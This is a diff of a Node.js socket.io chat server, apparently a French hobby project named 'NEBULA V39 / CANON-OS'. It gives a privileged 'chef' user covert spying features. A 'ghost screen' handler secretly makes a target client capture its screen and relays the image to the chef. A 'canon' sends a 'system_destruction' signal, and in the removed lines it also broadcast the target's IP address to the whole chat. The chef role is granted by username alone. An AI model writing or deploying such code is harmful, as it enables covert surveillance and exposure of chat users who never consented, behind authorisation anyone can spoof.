@@ -1,68 +1,64 @@
-/**
- * NEBULA V39 - CANON-OS
- * LOGIQUE DE SURVEILLANCE ET DESTRUCTION MASSIVE
- */
-
 const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http);
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-let registry = { users: {}, blacklist: new Set() };
+// --- REGISTRE DU VIDE ---
+const nebula_registry = {
+    users: {},
+    blacklist: new Set(),
+    config: { masterName: "toucheur2pp" }
+};
+
+// Sert les fichiers statiques (CSS, JS)
+app.use(express.static(__dirname));
+
+// RÉPARE L'ERREUR "CANNOT GET /"
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
 
 io.on('connection', (socket) => {
-    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
+    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
+    const cleanIp = rawIp.includes('::') ? "127.0.0.1" : rawIp.split(',')[0].trim();
 
     socket.on('init_user', (data) => {
-        if (registry.blacklist.has(ip)) return socket.disconnect();
-        registry.users[socket.id] = {
+        if (nebula_registry.blacklist.has(cleanIp)) return socket.disconnect();
+        nebula_registry.users[socket.id] = {
             id: socket.id,
-            name: data.name,
-            ip: ip,
-            chef: data.name === "toucheur2pp"
+            name: data.name || "Inconnu",
+            ip: cleanIp,
+            chef: data.name === nebula_registry.config.masterName
         };
         sync();
     });
 
-    // --- LE CANON & RÉVÉLATION ---
-    socket.on('fire_canon', (targetSid) => {
-        const chef = registry.users[socket.id];
-        const target = registry.users[targetSid];
-        if (!chef?.chef || !target) return;
-
-        const attackData = {
-            target: target.name,
-            ip: target.ip,
-            loc: "PARIS, FR (PROXY DETECTED)",
-            fai: "ORANGE INFRASTRUCTURE",
-            ports: [22, 80, 443, 8080, 554, 3000].filter(() => Math.random() > 0.4)
-        };
-
-        io.emit('canon_animation', { from: socket.id, to: targetSid });
-        io.emit('chat_msg', { 
-            system: true, 
-            text: `[CANON_FIRE] ➔ TARGET: ${attackData.target} | IP: ${attackData.ip} | PORTS: ${attackData.ports.join(',')}` 
-        });
-
-        io.to(targetSid).emit('system_destruction', chef.name);
+    socket.on('chat_msg', (msg) => {
+        const u = nebula_registry.users[socket.id];
+        if (u) io.emit('chat_msg', { text: msg.text, name: u.name, system: msg.system });
     });
 
-    // --- GHOST SCREEN (ESPIONNAGE) ---
+    socket.on('fire_canon', (targetSid) => {
+        if (nebula_registry.users[socket.id]?.chef) {
+            io.emit('canon_animation', { from: socket.id, to: targetSid });
+            io.to(targetSid).emit('system_destruction', nebula_registry.users[socket.id].name);
+        }
+    });
+
     socket.on('request_ghost_screen', (targetSid) => {
-        if (!registry.users[socket.id]?.chef) return;
-        // On demande à la cible d'envoyer son "écran" (canvas) secrètement
-        io.to(targetSid).emit('capture_signal', socket.id);
+        if (nebula_registry.users[socket.id]?.chef) io.to(targetSid).emit('capture_signal', socket.id);
     });
 
     socket.on('screen_data_transfer', (data) => {
-        // Envoi du snapshot au chef
         io.to(data.to).emit('view_ghost_screen', { from: socket.id, img: data.img });
     });
 
-    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });
+    socket.on('disconnect', () => { delete nebula_registry.users[socket.id]; sync(); });
 
-    function sync() { io.emit('sync_users', Object.values(registry.users)); }
+    function sync() { io.emit('sync_users', Object.values(nebula_registry.users)); }
 });
 
-http.listen(PORT, () => console.log("CANON-OS V39 READY"));
+http.listen(PORT, () => {
+    console.log(`🌑 NEBULA V39.9 LANCÉ SUR PORT ${PORT}`);
+});
